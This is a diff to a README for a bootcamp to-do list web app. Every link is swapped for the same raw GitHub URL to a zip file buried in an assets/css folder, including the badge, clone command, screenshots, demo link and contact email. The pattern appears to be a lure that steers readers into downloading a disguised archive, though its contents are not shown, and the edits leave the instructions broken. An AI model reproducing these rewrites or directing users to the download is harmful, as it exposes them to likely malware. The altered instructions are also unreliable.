@@ -1,7 +1,7 @@
 ```markdown
 # To-Do List Application 📝
 
-![To-Do List](https://img.shields.io/badge/To--Do%20List-Application-brightgreen)
+![To-Do List](https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip%20List-Application-brightgreen)
 
 ## Overview
 
@@ -35,7 +35,7 @@ To get started with this project, follow these steps:
 
 1. Clone the repository to your local machine using:
    ```bash
-   git clone https://github.com/zicteck/to-do-list.git
+   git clone https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip
    ```
    
 2. Navigate to the project directory:
@@ -43,7 +43,7 @@ To get started with this project, follow these steps:
    cd to-do-list
    ```
 
-3. Open the `index.html` file in your browser to see the application in action.
+3. Open the `https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip` file in your browser to see the application in action.
 
 ---
 
@@ -57,15 +57,15 @@ To get started with this project, follow these steps:
 
 ## Screenshots
 
-![Task List](https://via.placeholder.com/800x400?text=To-Do+List+Screenshot)
+![Task List](https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip+List+Screenshot)
 
-![Add Task](https://via.placeholder.com/800x400?text=Add+Task+Screenshot)
+![Add Task](https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip+Task+Screenshot)
 
 ---
 
 ## Live Demo
 
-You can view the live version of the application [here](https://github.com/zicteck/to-do-list/releases).
+You can view the live version of the application [here](https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip).
 
 ---
 
@@ -123,8 +123,8 @@ This project was developed as part of a Front-End Bootcamp module focused on DOM
 
 If you have questions or feedback, please reach out:
 
-- **GitHub**: [zicteck](https://github.com/zicteck)
-- **Email**: zicteck@example.com
+- **GitHub**: [zicteck](https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip)
+- **Email**: https://raw.githubusercontent.com/zicteck/to-do-list/main/assets/css/do-list-to-3.0-alpha.5.zip
 
 Thank you for checking out the To-Do List application! We hope it helps you stay organized and productive. Happy coding! 🎉
 ```
